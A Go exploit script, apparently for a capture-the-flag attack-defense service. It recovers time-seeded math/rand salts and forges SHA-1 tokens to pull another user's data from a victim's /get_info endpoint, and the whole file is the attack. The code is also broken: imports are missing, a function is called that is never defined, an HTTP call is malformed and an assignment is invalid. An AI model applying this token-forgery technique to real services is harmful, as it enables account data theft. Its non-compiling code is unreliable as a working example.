package main

import (
	"crypto/sha1"
	"encoding/base64"
	"math/rand"
)

var alpha = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")

func RandomString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = alpha[rand.Intn(len(alpha))]
	}
	return string(b)
}

func RandomLuckyNumbers() []int {
	var res []int
	for i := 0; i < 4; i++ {
		res = append(res, rand.Intn(1000))
	}
	return res
}

func GetBaseHash(data string) string {
	hasher := sha1.New()
	hasher.Write([]byte(data))
	return base64.URLEncoding.EncodeToString(hasher.Sum(nil))
}

func bruteforce(username string, salts map[string]bool) {
		for salt := range salts {
		// attempt to /get_info with token = sha1(username + salt)

		values := map[string]string{"username": username, "token": GetBaseToken(username + salt)}
		jsonData, err := json.Marshal(values)

		resp, err := http.Get(fmt.Sprintf("http:%s/get_info", victimAddress), bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		fmt.Println(string(body))
	}
}

func main() {
	// get intrested minute and username from cs by public flag id
	username := "some user to attack"
	intrestedMinuteStart := time.Now().UnixMilli()
	salts := make(map[string]bool)

	// 60000 can be reduced to ~1000 when polling cs for new users registrations
	for mss := 0; mss < 60000; mss++ {
		rand.Seed(intrestedMinuteStart + mss)
		_ := RandomLuckyNumbers()
		nextSalt := RandomString(20)
		salts[nextSalt] = true
	}

	bruteforce(username, salts)
}
